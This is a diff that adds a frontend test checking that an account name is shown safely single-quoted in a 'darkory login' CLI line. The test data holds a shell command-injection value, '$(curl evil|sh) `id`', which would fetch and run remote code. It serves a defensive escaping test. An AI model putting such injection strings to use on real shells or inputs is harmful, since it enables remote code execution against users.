@@ -310,3 +310,12 @@ describe("Settings › Install", () => {
     expect(screen.getByText("0 sessions running")).toBeInTheDocument();
   });
 });
+
+describe("Settings › Account's CLI line", () => {
+  it("single-quotes a name the shell would expand, so pasting it runs nothing", async () => {
+    const evil = { ...bob, name: "$(curl evil|sh) `id`" };
+    mockApi({ ...signedIn(evil), "GET /v1/me": me(evil) });
+    renderApp("/settings/account");
+    expect(await screen.findByText("darkory login '$(curl evil|sh) `id`'")).toBeInTheDocument();
+  });
+});
